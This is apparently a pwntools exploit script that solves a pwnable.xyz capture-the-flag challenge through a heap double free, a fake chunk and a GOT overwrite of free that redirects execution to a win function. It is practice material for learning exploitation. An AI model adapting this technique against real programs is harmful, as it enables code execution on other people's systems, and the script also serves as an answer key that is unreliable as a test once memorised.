from pwn import *

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30046)
e = ELF("challenge")

def create(cnt):
	s.recvuntil("> ")
	s.sendline("1")
	s.recvuntil(": ")
	s.sendline(str(cnt))

def select(idx):
	s.recvuntil("> ")
	s.sendline("2")
	s.recvuntil(": ")
	s.sendline(str(idx))

def edit(content):
	s.recvuntil("> ")
	s.sendline("3")
	s.recvuntil(": ")
	s.sendline(content)

def delete():
	s.recvuntil("> ")
	s.sendline("4")

#fake = 0x601fed
#fake = 0x602122
fake = 0x60227d - 8
win = 0x400DD9

#pause()

create(2)

select(2)
delete()
select(1)
delete()

select(1)
edit(p64(fake))

create(2)

pay = "A"*75 + p64(e.got['free'])

select(2)
edit(pay)

select(0)
edit(p64(win))

s.interactive()
